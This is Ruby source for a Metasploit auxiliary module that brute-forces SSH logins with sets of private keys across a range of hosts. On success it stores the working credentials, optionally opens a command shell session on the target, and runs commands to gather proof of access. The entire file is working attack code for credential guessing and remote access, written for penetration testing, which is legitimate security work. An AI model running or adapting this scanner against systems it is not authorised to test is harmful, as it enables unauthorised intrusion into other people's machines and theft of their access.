##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'
require 'sshkey'
require 'net/ssh/command_stream'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::SSH::Options

  attr_accessor :ssh_socket, :good_key

  def initialize
    super(
      'Name'        => 'SSH Public Key Login Scanner',
      'Description' => %q{
        This module will test ssh logins on a range of machines using
        a defined private key file, and report successful logins.
        If you have loaded a database plugin and connected to a database
        this module will record successful logins and hosts so you can
        track your access.

        Key files may be a single private key, or several private keys in a single
        directory. Only a single passphrase is supported however, so it must either
        be shared between subject keys or only belong to a single one.
      },
      'Author'      => ['todb', 'RageLtMan'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(22),
        OptPath.new('KEY_PATH', [false, 'Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub" will be skipped. Duplicate private keys will be ignored.']),
        OptString.new('KEY_PASS', [false, 'Passphrase for SSH private key(s)']),
        OptString.new('PRIVATE_KEY', [false, 'The string value of the private key that will be used. If you are using MSFConsole, this value should be set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are supported.'])
      ], self.class
    )

    register_advanced_options(
      [
        Opt::Proxies,
        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptString.new('SSH_KEYFILE_B64', [false, 'Raw data of an unencrypted SSH public key. This should be used by programmatic interfaces to this module only.', '']),
        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30]),
        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', true])
      ]
    )

    deregister_options(
      'PASSWORD','PASS_FILE','BLANK_PASSWORDS','USER_AS_PASS','USERPASS_FILE','PASSWORD_SPRAY',
      'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_SKIP_EXISTING'
    )

    @good_key = ''
    @strip_passwords = true

  end

  def rport
    datastore['RPORT']
  end

  def ip
    datastore['RHOST']
  end

  def session_setup(result, scanner, fingerprint, cred_core_private_id)
    return unless scanner.ssh_socket

    # Create a new session
    sess = Msf::Sessions::SshCommandShellBind.new(scanner.ssh_socket)

    # Clean up the stored data - need to stash the keyfile into
    # a datastore for later reuse.
    merge_me = {
      'USERPASS_FILE'        => nil,
      'USER_FILE'            => nil,
      'PASS_FILE'            => nil,
      'USERNAME'             => result.credential.public,
      'CRED_CORE_PRIVATE_ID' => cred_core_private_id,
      'SSH_KEYFILE_B64'      => [result.credential.private].pack("m*").gsub("\n",""),
      'KEY_PATH'             => nil
    }

    info = "#{proto_from_fullname} #{result.credential.public}:#{fingerprint} (#{ Rex::Socket.is_ipv6?(ip) ? '[' + ip + ']' : ip }:#{rport})"
    s = start_session(self, info, merge_me, false, sess.rstream, sess)
    self.sockets.delete(scanner.ssh_socket.transport.socket)

    # Set the session platform
    s.platform = scanner.get_platform(result.proof)

    # Create database host information
    host_info = {host: scanner.host}

    unless s.platform == 'unknown'
      host_info[:os_name] = s.platform
    end

    report_host(host_info)

    s
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} SSH - Testing Cleartext Keys")

    if datastore["USER_FILE"].blank? && datastore["USERNAME"].blank?
      validation_reason = "At least one of USER_FILE or USERNAME must be given"
      raise Msf::OptionValidateError.new(
        {
          "USER_FILE" => validation_reason,
          "USERNAME" => validation_reason
        }
      )
    end

    keys = KeyCollection.new(
      key_path: datastore['KEY_PATH'],
      password: datastore['KEY_PASS'],
      user_file: datastore['USER_FILE'],
      username: datastore['USERNAME'],
      private_key: datastore['PRIVATE_KEY']
    )

    unless keys.valid?
      print_error("Files that failed to be read:")
      keys.error_list.each do |err|
        print_line("\t- #{err}")
      end
    end

    keys = prepend_db_keys(keys)

    key_count = keys.key_data.count
    key_sources = []
    unless datastore['KEY_PATH'].blank?
      key_sources.append(datastore['KEY_PATH'])
    end

    unless datastore['PRIVATE_KEY'].blank?
      key_sources.append('PRIVATE_KEY')
    end


    print_brute :level => :vstatus, :ip => ip, :msg => "Testing #{key_count} #{'key'.pluralize(key_count)} from #{key_sources.join(' and ')}"
    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      host: ip,
      port: rport,
      cred_details: keys,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      proxies: datastore['Proxies'],
      connection_timeout: datastore['SSH_TIMEOUT'],
      framework: framework,
      framework_module: self,
      skip_gather_proof: !datastore['GatherProof']
    )

    scanner.verbosity = :debug if datastore['SSH_DEBUG']

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          tmp_key = result.credential.private
          ssh_key = SSHKey.new tmp_key
          if datastore['CreateSession']
            if credential_core.is_a? Metasploit::Credential::Core
              session_setup(result, scanner, ssh_key.fingerprint, credential_core.private_id)
            else
              session_setup(result, scanner, ssh_key.fingerprint, nil)
            end
          end
          if datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'
            msg = "While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with"
            msg << " 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with"
            msg << " device details so it can be handled in the future."
            print_brute :level => :error, :ip => ip, :msg => msg
          end
          :next_user
        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
          end
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
          invalidate_login(credential_data)
          :abort
        when Metasploit::Model::Login::Status::INCORRECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
          end
          invalidate_login(credential_data)
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        else
          invalidate_login(credential_data)
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      end
    end
  end

  class KeyCollection < Metasploit::Framework::CredentialCollection
    attr_accessor :key_data
    attr_accessor :key_path
    attr_accessor :private_key
    attr_accessor :error_list

    # Override CredentialCollection#has_privates?
    def has_privates?
      !@key_data.empty?
    end

    def realm
      nil
    end

    def valid?
      @error_list = []
      @key_data = Set.new

      unless @private_key.present? || @key_path.present?
        raise RuntimeError, "No key path or key provided"
      end

      if @key_path.present?
        if File.directory?(@key_path)
          @key_files ||= Dir.entries(@key_path).reject { |f| f =~ /^\x2e|\x2epub$/ }
          @key_files.each do |f|
            begin
              data = read_key(File.join(@key_path, f))
              @key_data << data if valid_key?(data)
            rescue StandardError => e
              @error_list << "#{File.join(@key_path, f)}: #{e}"
            end
          end
        elsif File.file?(@key_path)
          begin
            data = read_key(@key_path)
            @key_data << data if valid_key?(data)
          rescue StandardError => e
            @error_list << "#{@key_path} could not be read, #{e}"
          end
        else
          raise RuntimeError, "Invalid key path"
        end
      end

      if @private_key.present?
        data = Net::SSH::KeyFactory.load_data_private_key(@private_key, @password, false).to_s
        if valid_key?(data)
          @key_data << data
        else
          raise RuntimeError, "Invalid private key"
        end
      end

      !@key_data.empty?
    end

    def valid_key?(key_data)
      !!(key_data.match(/BEGIN [RECD]SA PRIVATE KEY/) && !key_data.match(/Proc-Type:.*ENCRYPTED/))
    end

    def each
      prepended_creds.each { |c| yield c }

      if @user_file.present?
        File.open(@user_file, 'rb') do |user_fd|
          user_fd.each_line do |user_from_file|
            user_from_file.chomp!
            each_key do |key_data|
              yield Metasploit::Framework::Credential.new(public: user_from_file, private: key_data, realm: realm, private_type: :ssh_key)
            end
          end
        end
      end

      if @username.present?
        each_key do |key_data|
          yield Metasploit::Framework::Credential.new(public: @username, private: key_data, realm: realm, private_type: :ssh_key)
        end
      end
    end

    def each_key
      @key_data.each do |data|
        yield data
      end
    end

    def read_key(file_path)
      @cache ||= {}
      @cache[file_path] ||= Net::SSH::KeyFactory.load_data_private_key(File.read(file_path), password, false, key_path).to_s
      @cache[file_path]
    end
  end
end
